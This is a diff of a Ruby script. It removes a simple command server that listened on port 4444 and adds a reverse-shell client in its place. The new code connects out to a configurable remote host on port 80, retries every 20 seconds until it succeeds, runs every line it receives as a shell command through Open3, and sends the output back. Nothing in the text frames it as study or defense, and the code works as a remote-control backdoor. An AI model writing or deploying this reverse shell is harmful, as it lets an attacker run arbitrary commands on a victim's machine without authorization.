@@ -1,21 +1,25 @@
 require 'socket'
+require 'etc'
+require 'open3'
 
+RHOST = ""
+PORT = 80
 
-PORT = 4444
-server = TCPServer.new(PORT)
-puts "[*] Server listening on port #{PORT}"
+    begin
+        sock = TCPSocket.new "#{RHOST}", "#{PORT}"
+        sock.puts "[\033[1;92m*\033[1;97m] Connected!"
+        sock.print ">> "
+        rescue
+          sleep 20
+          retry
+        end
 
-
-loop do
-  client = server.accept
-  puts "[*] Client connected from #{client.peeraddr[2]}:#{client.peeraddr[1]}"
-  while true
-    puts "RETURN:\n#{client.recv(1024)}"
-    cmd = gets.chomp
-    if cmd.empty?
-      cmd = "echo 'Hello World!'\n" 
+        begin
+          while line = sock.gets
+            Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
+                      IO.copy_stream(stdout_and_stderr, sock)
+                      end
+          end
+        rescue
+          retry
     end
-    client.puts cmd
-  end
-  client.close
-end
